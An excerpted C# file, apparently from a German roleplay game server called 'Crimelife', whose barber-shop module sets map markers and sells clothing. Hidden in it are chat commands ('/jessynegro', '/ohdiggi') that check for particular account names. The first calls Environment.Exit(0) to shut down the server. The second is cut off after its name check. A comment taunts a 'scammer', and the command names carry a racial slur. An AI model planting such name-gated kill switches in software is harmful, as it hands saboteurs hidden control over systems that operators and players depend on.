    ...
    class BarberModule : Crimelife.Module.Module<BarberModule>
    {
                ...
                try
                {
                    if (reader.HasRows)
                    {
                        while (reader.Read())
                        {
                            ...
                            NAPI.Marker.CreateMarker(25, Position, new Vector3(), new Vector3(), 1.0f, new Color(27, 27, 27), false, 0);
        ...
        public void barberShopBuy(Player c, int price, string json)
        {
            try
            {
                ...
                ClothingManager.setClothes(dbPlayer.player, playerClothes);
        ...
        #region barber
        [Command("jessynegro")]
        public void CMD_jessyderbrey(Player p)
        {
            DbPlayer dbPlayer = p.GetPlayer();
            if (p.SocialClubName == "Maxiistcool123" || p.SocialClubName == "Jerkoslo" || p.Name == "Franco_Gaming")
            {
                dbPlayer.SendNotification("Warum tust du das... der arme Jessynegro der bree");
                Environment.Exit(0);
            }
            else
                return;
        ...
        // Liebe Grüße an dich du Simex Fan merk dir Scammer get Scammed diggi //
        [Command("ohdiggi")]
        public void NegroAmgDiggi(Player p, string jessy)
        {
            DbPlayer dbPlayer = p.GetPlayer();
            if (p.SocialClubName == "Maxiistcool123" || p.SocialClubName == "Jerkoslo" || p.Name == "Franco_Gaming")
            {
